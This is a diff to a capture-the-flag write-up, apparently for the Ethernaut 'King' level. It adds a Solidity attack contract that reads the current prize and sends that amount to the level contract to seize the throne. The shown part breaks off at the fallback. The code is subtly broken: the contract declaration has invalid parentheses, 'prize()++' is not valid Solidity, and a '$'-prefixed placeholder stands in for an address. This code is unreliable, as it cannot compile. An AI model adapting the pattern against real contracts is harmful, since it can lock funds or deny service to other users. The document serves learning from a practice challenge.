@@ -30,9 +30,20 @@ In this scenario, the Napoleonic ponzi would be entirely broken as the msg.value
 So let's do it!
 
 ```
+interface King {
+    function prize() external view returns (uint);
+}
+
 contract NapoleonSucks() {
+
+    King king;
+    uint bribe;
+
     constructor(address $your_ethernaut_instance_here) payable {
-        $your_ethernaut_instance_here.call{ value: 0.001 }();
+        
+        king = King($your_ethernaut_instance_here);
+        bribe = king.prize()++;
+        $your_ethernaut_instance_here.call{ value: bribe }();
     }
 
     fallback() {
